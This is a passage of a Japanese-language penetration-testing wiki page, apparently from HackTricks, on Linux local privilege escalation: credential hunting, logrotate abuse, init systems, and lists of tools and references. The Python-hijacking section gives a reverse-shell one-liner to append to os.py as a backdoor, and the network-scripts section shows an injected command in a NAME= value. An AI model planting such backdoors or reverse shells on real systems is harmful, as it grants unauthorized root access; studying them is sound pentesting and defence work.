~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### 一般的な Creds 検索/Regex

ファイル名やファイルの内容に「**password**」という単語が含まれているファイル、ログ内のIPやメールアドレス、ハッシュ用のregexpsも確認してください。ここではそれらすべての方法を列挙しませんが、興味があれば [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) が行う最後のチェックを参照してください。

## 書き込み可能なファイル

### Python library hijacking

もしpythonスクリプトがどの場所から実行されるかを知っていて（**where**）、そのフォルダに書き込みができる（**can write inside**）か、あるいはpythonライブラリを改変できる（**modify python libraries**）場合、OSライブラリを改変してバックドアを仕込むことができます（pythonスクリプトが実行される場所に書き込みできるなら、os.pyライブラリをコピーして貼り付けてください）。

**backdoor the library**するには、os.pyライブラリの末尾に次の行を追加してください（IPとPORTは変更してください）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate の悪用

`logrotate` の脆弱性により、ログファイルやその親ディレクトリに対して **書き込み権限** を持つユーザーが権限昇格を行える可能性があります。これは多くの場合 **root** として動作する `logrotate` が、特に _**/etc/bash_completion.d/**_ のようなディレクトリで任意のファイルを実行するように操作できるためです。_ /var/log_ だけでなく、ログローテーションが適用されるすべてのディレクトリの権限を確認することが重要です。

> [!TIP]
> この脆弱性は `logrotate` バージョン `3.18.0` およびそれ以前に影響します

この脆弱性の詳細は以下のページを参照してください: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

この脆弱性は [**logrotten**](https://github.com/whotwagner/logrotten) で悪用できます。

この脆弱性は [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** に非常に類似しています。したがって、ログを改変できることが判明した場合は、誰がそのログを管理しているかを確認し、ログをシンボリックリンクに差し替えて権限昇格できないか検証してください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

何らかの理由でユーザーが **_/etc/sysconfig/network-scripts_ に `ifcf-<whatever>` スクリプトを書き込める_**、または既存のものを**修正**できる場合、あなたの **system is pwned**。

ネットワークスクリプト（例: _ifcg-eth0_）はネットワーク接続に使用されます。見た目は .INI ファイルと全く同じです。しかし、これらは Linux 上で Network Manager (dispatcher.d) によって \~sourced\~ されます。

私の場合、これらのネットワークスクリプト内の `NAME=` の値が正しく処理されていません。名前に**空白が含まれると、システムは空白以降の部分を実行しようとします**。つまり、**最初の空白以降のすべてが root として実行されます**。

例えば: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network と /bin/id の間に空白があることに注意_)

### **init, init.d, systemd, and rc.d**

ディレクトリ `/etc/init.d` は System V init (SysVinit) 用の **スクリプト** の格納場所です。これは **古典的な Linux のサービス管理システム** に相当します。ここにはサービスを `start`、`stop`、`restart`、場合によっては `reload` するスクリプトが含まれます。これらは直接実行するか、`/etc/rc?.d/` にあるシンボリックリンク経由で実行できます。Redhat 系では代替パスとして `/etc/rc.d/init.d` が使われます。

一方、`/etc/init` は **Upstart** に関連しており、Ubuntu が導入したより新しい **service management** で、サービス管理に設定ファイルを使用します。Upstart への移行が進んでも、互換レイヤーにより SysVinit のスクリプトは Upstart の設定と並行して引き続き利用されます。

**systemd** はモダンな初期化およびサービスマネージャとして登場し、オンデマンドのデーモン起動、automount 管理、システム状態のスナップショットなどの高度な機能を提供します。ファイルは配布パッケージ用に `/usr/lib/systemd/`、管理者が変更するために `/etc/systemd/system/` に整理され、システム管理を効率化します。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks は一般に syscall をフックして、特権的なカーネル機能を userspace の manager に公開します。弱い manager 認証（例：FD 順に基づく署名チェックや脆弱なパスワード方式）は、ローカルアプリが manager を偽装して、既に root 化されたデバイス上で root にエスカレートすることを可能にする場合があります。詳細とエクスプロイトの手順は以下を参照してください：


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations における正規表現駆動の service discovery は、プロセスのコマンドラインからバイナリパスを抽出し、privileged context 下で -v オプション付きでそれを実行する可能性があります。許容度の高いパターン（例：\S を使用）が、書き込み可能な場所（例：/tmp/httpd）に配置した攻撃者のリスナーと一致し、root としての実行につながる場合があります（CWE-426 Untrusted Search Path）。

詳細と他の discovery/monitoring スタックにも適用できる一般化パターンは以下を参照してください：

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux と MAC のカーネル脆弱性を列挙するツール [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
